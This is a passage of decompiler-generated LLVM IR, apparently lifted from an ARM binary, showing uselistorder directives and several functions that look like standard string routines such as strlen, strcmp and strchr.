  uselistorder i32 %v0_153c8, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_153c0, { 1, 0 }
  uselistorder i32 %v1_153b8, { 2, 1, 0 }
  uselistorder i32 %v2_153b0, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_153b0, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_153ac, { 1, 0 }
  uselistorder i32 %v2_153a0, { 1, 0 }
  uselistorder i32 %v1_153a0, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_153a0, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 15, 16, 17, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 26, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* %r2.global-to-local, { 0, 69, 1, 2, 3, 4, 5, 70, 6, 7, 8, 9, 10, 71, 11, 12, 67, 68, 72, 28, 13, 14, 16, 15, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 29, 30, 62, 31, 32, 33, 34, 35, 63, 36, 37, 38, 39, 40, 64, 41, 42, 43, 44, 45, 65, 46, 47, 48, 50, 49, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 66 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 0, 56, 2, 4, 6, 8, 5, 57, 7, 9, 11, 54, 10, 58, 53, 55, 59, 62, 60, 66, 67, 12, 13, 14, 16, 15, 17, 18, 61, 19, 20, 63, 21, 64, 22, 65, 23, 24, 25, 26, 27, 30, 28, 40, 29, 31, 34, 32, 41, 33, 35, 38, 36, 42, 37, 39, 43, 44, 47, 45, 48, 46, 49, 50, 51, 52 }
  uselistorder i32* %r0.global-to-local, { 0, 28, 1, 2, 29, 3, 4, 30, 5, 27, 33, 34, 6, 7, 19, 8, 10, 9, 11, 12, 31, 13, 14, 32, 15, 16, 17, 18, 20, 21, 23, 22, 24, 25, 26 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 35, 36, 37, 6, 7, 8, 9, 10, 11, 12, 13, 14, 23, 15, 16, 17, 24, 18, 19, 20, 25, 21, 22, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 46, 47, 11, 12, 13, 14, 15, 16, 17, 18, 3, 19, 20, 21, 22, 23, 2, 24, 0, 25, 1, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 44, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 20, 21, 22, 2, 23, 0, 24, 1, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 49, 50, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 20, 21, 22, 23, 24, 2, 25, 0, 26, 1, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 -3, { 0, 4, 5, 3, 1, 2 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1, 6 }
  uselistorder i32 15, { 27, 28, 29, 0, 38, 1, 39, 30, 31, 6, 32, 7, 33, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 3, 2, 18, 19, 20, 21, 22, 23, 24, 25, 34, 26, 35, 4, 36, 5, 37 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 28, 2, 4, 5, 3, 6, 7, 8, 9, 17, 33, 38, 36, 37, 35, 29, 30, 21, 22, 31, 32, 34, 24, 25, 26, 18, 27, 23, 11, 12, 10, 13, 14, 15, 16, 19, 20, 0, 1 }
  uselistorder i32 -5, { 1, 0, 2, 3 }
  uselistorder i32 11, { 8, 9, 10, 20, 28, 29, 2, 11, 3, 12, 4, 13, 14, 15, 16, 5, 17, 18, 19, 21, 22, 6, 24, 7, 25, 0, 26, 1, 27, 23 }
  uselistorder i32 -12, { 0, 12, 13, 1, 15, 16, 2, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 22, 6, 3, 5, 4, 23 }
  uselistorder i32 48, { 0, 2, 4, 12, 3, 5, 6, 13, 14, 8, 9, 10, 11, 18, 19, 20, 15, 16, 7, 17, 1 }
  uselistorder i32 40, { 3, 9, 11, 4, 2, 7, 6, 10, 12, 8, 13, 14, 15, 5, 16, 17, 0, 18, 20, 19, 21, 1, 22, 24, 23 }
  uselistorder i32 36, { 4, 19, 5, 6, 7, 20, 8, 17, 9, 18, 10, 11, 12, 0, 1, 13, 2, 14, 3, 15, 16 }
  uselistorder i32 -16, { 6, 7, 8, 9, 10, 11, 12, 13, 14, 5, 4, 3, 1, 15, 16, 17, 18, 19, 20, 2, 0 }
  uselistorder i32 31, { 4, 5, 6, 7, 0, 1, 2, 3 }
  uselistorder i32 -32, { 3, 2, 4, 0, 1, 5 }
  uselistorder i32 24, { 0, 59, 60, 61, 62, 8, 9, 10, 12, 11, 13, 1, 14, 63, 64, 65, 15, 66, 16, 17, 67, 18, 58, 91, 92, 54, 55, 56, 57, 19, 20, 21, 22, 108, 109, 23, 110, 24, 2, 25, 93, 94, 26, 95, 52, 53, 27, 84, 85, 86, 81, 76, 68, 69, 70, 71, 72, 73, 74, 75, 77, 78, 79, 80, 82, 83, 87, 88, 89, 90, 28, 98, 29, 99, 30, 100, 31, 32, 33, 34, 35, 101, 36, 37, 3, 38, 39, 40, 4, 41, 42, 5, 43, 44, 102, 45, 6, 103, 46, 104, 105, 106, 107, 47, 48, 7, 111, 49, 112, 50, 96, 51, 97 }
  uselistorder i32 27, { 1, 0, 5, 2, 3, 4, 6 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32* @lr, { 150, 151, 152, 153, 154, 155, 156, 157, 158, 3, 4, 5, 6, 7, 8, 9, 10, 11, 2, 57, 58, 37, 159, 160, 12, 13, 116, 117, 118, 119, 120, 121, 113, 114, 115, 122, 135, 136, 123, 124, 125, 126, 127, 128, 129, 1, 130, 131, 133, 134, 132, 44, 45, 46, 47, 48, 49, 137, 138, 139, 50, 140, 59, 16, 17, 18, 19, 20, 0, 24, 25, 21, 22, 23, 14, 15, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 39, 40, 41, 42, 43, 51, 52, 53, 54, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 141, 142, 143, 144, 145, 146, 147, 148, 149, 55, 56 }
  uselistorder label %dec_label_pc_15810, { 2, 0, 1 }
  uselistorder label %dec_label_pc_157a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15738, { 2, 0, 1 }
  uselistorder label %dec_label_pc_156d8, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 3, 7, 0, 1, 2 }
  uselistorder label %dec_label_pc_15664, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_15628, { 1, 0 }
  uselistorder label %dec_label_pc_15614, { 1, 0 }
  uselistorder label %dec_label_pc_155d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15568, { 2, 0, 1 }
  uselistorder label %dec_label_pc_154fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1549c, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_1546c, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_15408, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_153c8, { 1, 0 }
}

define i32 @function_15830(i32 %arg1) local_unnamed_addr {
dec_label_pc_15830:
  %v1_15830 = and i32 %arg1, -4
  %v1_15834 = inttoptr i32 %v1_15830 to i32*
  %v2_15834 = load i32, i32* %v1_15834, align 4
  %v1_15838 = urem i32 %arg1, 4
  store i32 %v1_15838, i32* @r3, align 4
  %v2_15838 = icmp eq i32 %v1_15838, 0
  %v1_1583c = sub nsw i32 0, %v1_15838
  br i1 %v2_15838, label %.preheader.preheader, label %dec_label_pc_15844

dec_label_pc_15844:                               ; preds = %dec_label_pc_15830
  %v1_15844 = or i32 %v2_15834, 255
  %v7_15848 = icmp eq i32 %v1_15838, 1
  br i1 %v7_15848, label %bb33, label %bb

bb:                                               ; preds = %dec_label_pc_15844
  %v9_1584c = or i32 %v2_15834, 65535
  br label %bb33

bb33:                                             ; preds = %dec_label_pc_15844, %bb
  %v8_15854 = phi i32 [ %v1_15844, %dec_label_pc_15844 ], [ %v9_1584c, %bb ]
  %v1_15850 = add nsw i32 %v1_15838, -2
  store i32 %v1_15850, i32* @r3, align 4
  %v7_15854 = icmp eq i32 %v1_15838, 3
  br i1 %v7_15854, label %bb34, label %.preheader.preheader

bb34:                                             ; preds = %bb33
  %v9_15854 = or i32 %v8_15854, 16711680
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %bb33, %bb34, %dec_label_pc_15830
  %v1_15864.ph = phi i32 [ %v2_15834, %dec_label_pc_15830 ], [ %v9_15854, %bb34 ], [ %v8_15854, %bb33 ]
  %v1_1585838 = urem i32 %v1_15864.ph, 256
  %v2_1585839 = icmp eq i32 %v1_1585838, 0
  %v2_1585c40 = and i32 %v1_15864.ph, 65280
  %v3_1585c41 = icmp eq i32 %v2_1585c40, 0
  %or.cond42 = or i1 %v2_1585839, %v3_1585c41
  %v2_1586043 = and i32 %v1_15864.ph, 16711680
  %v3_1586044 = icmp eq i32 %v2_1586043, 0
  %or.cond3145 = or i1 %v3_1586044, %or.cond42
  %v4_1586446 = icmp ult i32 %v1_15864.ph, 16777216
  %or.cond3247 = or i1 %v4_1586446, %or.cond3145
  br i1 %or.cond3247, label %dec_label_pc_15874, label %.thread4

.thread4:                                         ; preds = %.preheader.preheader, %.thread4
  %v1_158681349 = phi i32 [ %v2_1586814, %.thread4 ], [ %v1_1583c, %.preheader.preheader ]
  %v1_1586c48.in = phi i32 [ %v1_1586c48, %.thread4 ], [ %v1_15830, %.preheader.preheader ]
  %v1_1586c48 = add i32 %v1_1586c48.in, 4
  %v2_1586814 = add i32 %v1_158681349, 4
  %v2_1586c = inttoptr i32 %v1_1586c48 to i32*
  %v3_1586c = load i32, i32* %v2_1586c, align 4
  %v1_15858 = urem i32 %v3_1586c, 256
  %v2_15858 = icmp eq i32 %v1_15858, 0
  %v2_1585c = and i32 %v3_1586c, 65280
  %v3_1585c = icmp eq i32 %v2_1585c, 0
  %or.cond = or i1 %v2_15858, %v3_1585c
  %v2_15860 = and i32 %v3_1586c, 16711680
  %v3_15860 = icmp eq i32 %v2_15860, 0
  %or.cond31 = or i1 %v3_15860, %or.cond
  %v4_15864 = icmp ult i32 %v3_1586c, 16777216
  %or.cond32 = or i1 %v4_15864, %or.cond31
  br i1 %or.cond32, label %dec_label_pc_15874, label %.thread4

dec_label_pc_15874:                               ; preds = %.thread4, %.preheader.preheader
  %v1_1586813.lcssa = phi i32 [ %v1_1583c, %.preheader.preheader ], [ %v2_1586814, %.thread4 ]
  %v2_15858.lcssa = phi i1 [ %v2_1585839, %.preheader.preheader ], [ %v2_15858, %.thread4 ]
  %v3_1585c.lcssa = phi i1 [ %v3_1585c41, %.preheader.preheader ], [ %v3_1585c, %.thread4 ]
  %v3_15860.lcssa = phi i1 [ %v3_1586044, %.preheader.preheader ], [ %v3_15860, %.thread4 ]
  br i1 %v2_15858.lcssa, label %.thread10, label %bb35

bb35:                                             ; preds = %dec_label_pc_15874
  %v2_15878 = add i32 %v1_1586813.lcssa, 1
  br i1 %v3_1585c.lcssa, label %.thread10, label %bb36

bb36:                                             ; preds = %bb35
  %v2_1588017 = add i32 %v1_1586813.lcssa, 2
  br i1 %v3_15860.lcssa, label %.thread10, label %bb37

bb37:                                             ; preds = %bb36
  %v2_15888 = add i32 %v1_1586813.lcssa, 3
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_15874, %bb35, %bb36, %bb37
  %v1_1588c = phi i32 [ %v2_15878, %bb35 ], [ %v2_1588017, %bb36 ], [ %v2_15888, %bb37 ], [ %v1_1586813.lcssa, %dec_label_pc_15874 ]
  ret i32 %v1_1588c

; uselistorder directives
  uselistorder i32 %v1_1586813.lcssa, { 1, 3, 2, 0 }
  uselistorder i32 %v3_1586c, { 3, 2, 1, 0 }
  uselistorder i32 %v1_15864.ph, { 1, 2, 3, 0 }
  uselistorder i32 %v1_15838, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 16711680, { 2, 0, 5, 1, 4, 3, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 6 }
  uselistorder i32 -2, { 1, 3, 4, 2, 6, 7, 8, 0, 5, 9, 25, 24, 26, 27, 28, 17, 18, 19, 20, 21, 22, 23, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 65535, { 2, 105, 0, 1, 10, 11, 3, 4, 24, 23, 27, 53, 26, 54, 12, 13, 5, 28, 55, 29, 56, 57, 14, 58, 25, 30, 59, 31, 60, 32, 61, 62, 63, 33, 64, 65, 15, 66, 6, 37, 67, 36, 68, 34, 69, 35, 70, 71, 16, 72, 7, 73, 74, 41, 75, 40, 76, 38, 77, 39, 78, 18, 17, 79, 80, 42, 81, 43, 82, 20, 19, 83, 84, 44, 85, 45, 86, 87, 88, 46, 89, 90, 91, 92, 21, 93, 94, 8, 47, 95, 48, 96, 49, 97, 98, 99, 22, 100, 101, 9, 52, 102, 50, 103, 51, 104 }
  uselistorder i32 -4, { 41, 18, 62, 63, 64, 6, 19, 20, 21, 65, 66, 67, 7, 22, 23, 24, 68, 69, 70, 8, 25, 26, 71, 17, 16, 72, 73, 74, 15, 14, 13, 12, 27, 28, 29, 30, 31, 5, 32, 3, 33, 4, 75, 11, 34, 49, 50, 51, 9, 52, 53, 54, 35, 48, 2, 36, 42, 43, 44, 45, 46, 47, 0, 1, 55, 56, 57, 58, 59, 60, 61, 37, 38, 39, 40, 10 }
  uselistorder label %.thread10, { 3, 2, 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0, 2 }
  uselistorder label %bb33, { 1, 0 }
}

define i32 @function_15890(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_15894.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_15890

dec_label_pc_15890:                               ; preds = %bb3, %bb
  %v0_15894 = phi i32 [ %v0_15894.pre, %bb ], [ %v5_15894, %bb3 ]
  %v0_15890 = phi i32 [ %tmp, %bb ], [ %v5_15890, %bb3 ]
  %v1_15890 = inttoptr i32 %v0_15890 to i8*
  %v2_15890 = load i8, i8* %v1_15890, align 1
  %v1_15894 = inttoptr i32 %v0_15894 to i8*
  %v2_15894 = load i8, i8* %v1_15894, align 1
  %v3_15894 = zext i8 %v2_15894 to i32
  %v2_15898 = icmp eq i8 %v2_15890, 0
  br i1 %v2_15898, label %.dec_label_pc_158a4_crit_edge, label %bb3

bb3:                                              ; preds = %dec_label_pc_15890
  %v5_15894 = add i32 %v0_15894, 1
  %v5_15890 = add i32 %v0_15890, 1
  %v3_15890 = zext i8 %v2_15890 to i32
  %v10_1589c = icmp eq i8 %v2_15890, %v2_15894
  br i1 %v10_1589c, label %dec_label_pc_15890, label %dec_label_pc_158a4

.dec_label_pc_158a4_crit_edge:                    ; preds = %dec_label_pc_15890
  br label %dec_label_pc_158a4

dec_label_pc_158a4:                               ; preds = %bb3, %.dec_label_pc_158a4_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_158a4_crit_edge ], [ %v3_15890, %bb3 ]
  %v2_158a4.pre-phi = sub nsw i32 %.pn, %v3_15894
  ret i32 %v2_158a4.pre-phi

; uselistorder directives
  uselistorder i8 %v2_15890, { 0, 2, 1 }
  uselistorder i32 %v0_15890, { 1, 0 }
  uselistorder i32 %v0_15894, { 1, 0 }
  uselistorder label %dec_label_pc_158a4, { 1, 0 }
}

define i32 @function_158b0() local_unnamed_addr {
dec_label_pc_158b0:
  %stack_var_-16 = alloca i32, align 4
  %v3_158b0 = load i32, i32* @r4, align 4
  store i32 %v3_158b0, i32* %stack_var_-16, align 4
  %v6_158b0 = load i32, i32* @r5, align 4
  %v9_158b0 = load i32, i32* @r6, align 4
  %v0_158b4 = load i32, i32* @r0, align 4
  %v0_158b8 = load i32, i32* @r1, align 4
  store i32 %v0_158b8, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_158d48 = inttoptr i32 %v0_158b4 to i8*
  %v2_158d49 = load i8, i8* %v1_158d48, align 1
  %v2_158d811 = icmp eq i8 %v2_158d49, 0
  store i32 %v0_158b8, i32* @r0, align 4
  %v1_158e012 = add i32 %v0_158b4, 1
  store i32 %v1_158e012, i32* @r4, align 4
  br i1 %v2_158d811, label %dec_label_pc_158e8, label %dec_label_pc_158c4

dec_label_pc_158c4:                               ; preds = %dec_label_pc_158b0, %dec_label_pc_158d0
  %v3_158d414.in = phi i8 [ %v2_158d4, %dec_label_pc_158d0 ], [ %v2_158d49, %dec_label_pc_158b0 ]
  %v0_158dc13 = phi i32 [ %v0_158dc.pre, %dec_label_pc_158d0 ], [ %v0_158b8, %dec_label_pc_158b0 ]
  %v3_158d414 = zext i8 %v3_158d414.in to i32
  %v2_158c4 = call i32 @function_15a7c(i32 %v0_158dc13, i32 %v3_158d414)
  %v2_158c8 = icmp eq i32 %v2_158c4, 0
  %v0_158d0 = load i32, i32* @r5, align 4
  br i1 %v2_158c8, label %dec_label_pc_158d0, label %dec_label_pc_158e8

dec_label_pc_158d0:                               ; preds = %dec_label_pc_158c4
  %v1_158d0 = add i32 %v0_158d0, 1
  %v0_158d4.pre = load i32, i32* @r4, align 4
  %v0_158dc.pre = load i32, i32* @r6, align 4
  store i32 %v1_158d0, i32* @r5, align 4
  %v1_158d4 = inttoptr i32 %v0_158d4.pre to i8*
  %v2_158d4 = load i8, i8* %v1_158d4, align 1
  %v2_158d8 = icmp eq i8 %v2_158d4, 0
  store i32 %v0_158dc.pre, i32* @r0, align 4
  %v1_158e0 = add i32 %v0_158d4.pre, 1
  store i32 %v1_158e0, i32* @r4, align 4
  br i1 %v2_158d8, label %dec_label_pc_158e8, label %dec_label_pc_158c4

dec_label_pc_158e8:                               ; preds = %dec_label_pc_158d0, %dec_label_pc_158c4, %dec_label_pc_158b0
  %v0_158e8 = phi i32 [ 0, %dec_label_pc_158b0 ], [ %v0_158d0, %dec_label_pc_158c4 ], [ %v1_158d0, %dec_label_pc_158d0 ]
  %v2_158ec = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_158ec, i32* @r4, align 4
  store i32 %v6_158b0, i32* @r5, align 4
  store i32 %v9_158b0, i32* @r6, align 4
  ret i32 %v0_158e8

; uselistorder directives
  uselistorder i8 %v2_158d4, { 1, 0 }
  uselistorder i32 %v0_158dc.pre, { 1, 0 }
  uselistorder i32 %v0_158d4.pre, { 1, 0 }
  uselistorder i32* @r6, {}
  uselistorder label %dec_label_pc_158c4, { 1, 0 }
}

define i32 @function_158f4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_158f4:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_159242 = load i32, i32* @r0, align 4
  %v1_159243 = inttoptr i32 %v0_159242 to i8*
  %v2_159244 = load i8, i8* %v1_159243, align 1
  %v3_159245 = zext i8 %v2_159244 to i32
  store i32 %v3_159245, i32* @ip, align 4
  %v2_159286 = icmp eq i8 %v2_159244, 0
  br i1 %v2_159286, label %dec_label_pc_15934, label %dec_label_pc_15908.preheader

dec_label_pc_15900:                               ; preds = %dec_label_pc_15908
  %v3_15908 = zext i8 %v2_15908 to i32
  %v1_15910 = add i32 %v0_15910, 1
  %v9_15900 = icmp eq i32 %v0_1590010, %v3_15908
  br i1 %v9_15900, label %dec_label_pc_1591c, label %dec_label_pc_15908

dec_label_pc_15908:                               ; preds = %dec_label_pc_15908.preheader, %dec_label_pc_15900
  %v0_15910 = phi i32 [ %tmp, %dec_label_pc_15908.preheader ], [ %v1_15910, %dec_label_pc_15900 ]
  %v1_15908 = inttoptr i32 %v0_15910 to i8*
  %v2_15908 = load i8, i8* %v1_15908, align 1
  %v2_1590c = icmp eq i8 %v2_15908, 0
  br i1 %v2_1590c, label %dec_label_pc_15934, label %dec_label_pc_15900

dec_label_pc_1591c:                               ; preds = %dec_label_pc_15900
  %v1_1591c = add i32 %v0_1591c, 1
  %v1_15920 = add i32 %v0_15920, 1
  %v1_15924 = inttoptr i32 %v1_15920 to i8*
  %v2_15924 = load i8, i8* %v1_15924, align 1
  %v3_15924 = zext i8 %v2_15924 to i32
  store i32 %v3_15924, i32* @ip, align 4
  %v2_15928 = icmp eq i8 %v2_15924, 0
  br i1 %v2_15928, label %dec_label_pc_15934, label %dec_label_pc_15908.preheader

dec_label_pc_15908.preheader:                     ; preds = %dec_label_pc_158f4, %dec_label_pc_1591c
  %v0_15920 = phi i32 [ %v1_15920, %dec_label_pc_1591c ], [ %v0_159242, %dec_label_pc_158f4 ]
  %v0_1591c = phi i32 [ %v1_1591c, %dec_label_pc_1591c ], [ 0, %dec_label_pc_158f4 ]
  %v0_1590010 = phi i32 [ %v3_15924, %dec_label_pc_1591c ], [ %v3_159245, %dec_label_pc_158f4 ]
  br label %dec_label_pc_15908

dec_label_pc_15934:                               ; preds = %dec_label_pc_1591c, %dec_label_pc_15908, %dec_label_pc_158f4
  %v0_15934 = phi i32 [ 0, %dec_label_pc_158f4 ], [ %v0_1591c, %dec_label_pc_15908 ], [ %v1_1591c, %dec_label_pc_1591c ]
  ret i32 %v0_15934

; uselistorder directives
  uselistorder i32 %v0_15910, { 1, 0 }
  uselistorder label %dec_label_pc_15908.preheader, { 1, 0 }
}

define i32 @function_15940(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15940:
  store i32 %arg1, i32* @r0, align 4
  %v1_15944 = urem i32 %arg2, 256
  store i32 %v1_15944, i32* @r4, align 4
  %v2_15944 = icmp eq i32 %v1_15944, 0
  br i1 %v2_15944, label %dec_label_pc_15958, label %dec_label_pc_1596c.preheader

dec_label_pc_1596c.preheader:                     ; preds = %dec_label_pc_15940
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_159743 = call i32 @function_15a7c(i32 %arg1, i32 %v1_15944)
  %v2_159785 = icmp eq i32 %v2_159743, 0
  br i1 %v2_159785, label %dec_label_pc_15980, label %dec_label_pc_15964

dec_label_pc_15958:                               ; preds = %dec_label_pc_15940
  %v2_1595c = call i32 @function_15a7c(i32 %arg1, i32 0)
  br label %dec_label_pc_15984

dec_label_pc_15964:                               ; preds = %dec_label_pc_1596c.preheader, %dec_label_pc_15964
  %v2_159746 = phi i32 [ %v2_15974, %dec_label_pc_15964 ], [ %v2_159743, %dec_label_pc_1596c.preheader ]
  store i32 %v2_159746, i32* @r5, align 4
  %v1_15968 = add i32 %v2_159746, 1
  store i32 %v1_15968, i32* @r0, align 4
  %v0_15970 = load i32, i32* @r4, align 4
  %v2_15974 = call i32 @function_15a7c(i32 %v1_15968, i32 %v0_15970)
  %v2_15978 = icmp eq i32 %v2_15974, 0
  br i1 %v2_15978, label %dec_label_pc_15980, label %dec_label_pc_15964

dec_label_pc_15980:                               ; preds = %dec_label_pc_15964, %dec_label_pc_1596c.preheader
  %v0_15980 = load i32, i32* @r5, align 4
  br label %dec_label_pc_15984

dec_label_pc_15984:                               ; preds = %dec_label_pc_15958, %dec_label_pc_15980
  %storemerge = phi i32 [ %v2_1595c, %dec_label_pc_15958 ], [ %v0_15980, %dec_label_pc_15980 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_15974, { 1, 0 }
  uselistorder i32 %v1_15968, { 1, 0 }
  uselistorder i32 %v1_15944, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_15a7c, { 2, 1, 0, 5, 3, 4 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_15984, { 1, 0 }
  uselistorder label %dec_label_pc_15964, { 1, 0 }
}

define i32 @function_15990(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15990:
  %v1_15994 = urem i32 %arg1, 256
  %v0_159b42 = load i32, i32* @r0, align 4
  %v1_159b43 = urem i32 %v0_159b42, 4
  %v2_159b44 = icmp eq i32 %v1_159b43, 0
  br i1 %v2_159b44, label %dec_label_pc_159bc, label %dec_label_pc_1599c

dec_label_pc_1599c:                               ; preds = %dec_label_pc_15990, %dec_label_pc_159b0
  %v0_159b0 = phi i32 [ %v1_159b0, %dec_label_pc_159b0 ], [ %v0_159b42, %dec_label_pc_15990 ]
  %v1_1599c = inttoptr i32 %v0_159b0 to i8*
  %v2_1599c = load i8, i8* %v1_1599c, align 1
  %v3_1599c = zext i8 %v2_1599c to i32
  %v9_159a0 = icmp eq i32 %v3_1599c, %v1_15994
  br i1 %v9_159a0, label %dec_label_pc_15a6c, label %dec_label_pc_159a8

dec_label_pc_159a8:                               ; preds = %dec_label_pc_1599c
  %v2_159a8 = icmp eq i8 %v2_1599c, 0
  br i1 %v2_159a8, label %dec_label_pc_15a6c, label %dec_label_pc_159b0

dec_label_pc_159b0:                               ; preds = %dec_label_pc_159a8
  %v1_159b0 = add i32 %v0_159b0, 1
  %v1_159b4 = urem i32 %v1_159b0, 4
  %v2_159b4 = icmp eq i32 %v1_159b4, 0
  br i1 %v2_159b4, label %dec_label_pc_159bc, label %dec_label_pc_1599c

dec_label_pc_159bc:                               ; preds = %dec_label_pc_159b0, %dec_label_pc_15990
  %v0_159c0 = phi i32 [ %v0_159b42, %dec_label_pc_15990 ], [ %v1_159b0, %dec_label_pc_159b0 ]
  %v4_159bc = mul nuw nsw i32 %v1_15994, 256
  %v5_159bc = or i32 %v4_159bc, %v1_15994
  %v4_159c4 = mul i32 %v5_159bc, 65536
  %v5_159c4 = or i32 %v4_159c4, %v5_159bc
  br label %dec_label_pc_159c8

dec_label_pc_159c8:                               ; preds = %dec_label_pc_15a64, %dec_label_pc_15a04, %dec_label_pc_159bc
  %v0_15a2c = phi i32 [ %v0_159c0, %dec_label_pc_159bc ], [ %v4_159c8, %dec_label_pc_15a04 ], [ %v4_159c8, %dec_label_pc_15a64 ]
  %v1_159c8 = inttoptr i32 %v0_15a2c to i32*
  %v2_159c8 = load i32, i32* %v1_159c8, align 4
  %v4_159c8 = add i32 %v0_15a2c, 4
  %v2_159d0 = xor i32 %v2_159c8, %v5_159c4
  %v2_159d4 = add i32 %v2_159d0, 2130640639
  store i32 %v2_159d4, i32* @ip, align 4
  %v2_159dc = add i32 %v2_159c8, 2130640639
  %v1_159e0 = sub i32 -1, %v2_159c8
  %v2_159e4 = xor i32 %v2_159dc, %v1_159e0
  %v2_159f0 = and i32 %v2_159e4, -2130640640
  %v2_159f8 = icmp eq i32 %v2_159f0, 0
  br i1 %v2_159f8, label %dec_label_pc_15a04, label %dec_label_pc_15a0c

dec_label_pc_15a04:                               ; preds = %dec_label_pc_159c8
  %v1_159ec = sub i32 -1, %v2_159d0
  %v2_159f4 = xor i32 %v2_159d4, %v1_159ec
  %v2_159fc = and i32 %v2_159f4, -2130640640
  %v2_15a04 = icmp eq i32 %v2_159fc, 0
  br i1 %v2_15a04, label %dec_label_pc_159c8, label %dec_label_pc_15a0c

dec_label_pc_15a0c:                               ; preds = %dec_label_pc_159c8, %dec_label_pc_15a04
  %v2_15a0c = inttoptr i32 %v0_15a2c to i8*
  %v3_15a0c = load i8, i8* %v2_15a0c, align 1
  %v4_15a0c = zext i8 %v3_15a0c to i32
  %v9_15a10 = icmp eq i32 %v4_15a0c, %v1_15994
  br i1 %v9_15a10, label %dec_label_pc_15a6c, label %dec_label_pc_15a1c

dec_label_pc_15a1c:                               ; preds = %dec_label_pc_15a0c
  %v2_15a1c = icmp eq i8 %v3_15a0c, 0
  br i1 %v2_15a1c, label %dec_label_pc_15a6c, label %dec_label_pc_15a24

dec_label_pc_15a24:                               ; preds = %dec_label_pc_15a1c
  %v1_15a24 = add i32 %v0_15a2c, 1
  %v2_15a24 = inttoptr i32 %v1_15a24 to i8*
  %v3_15a24 = load i8, i8* %v2_15a24, align 1
  %v4_15a24 = zext i8 %v3_15a24 to i32
  %v9_15a28 = icmp eq i32 %v4_15a24, %v1_15994
  br i1 %v9_15a28, label %dec_label_pc_15a6c, label %dec_label_pc_15a34

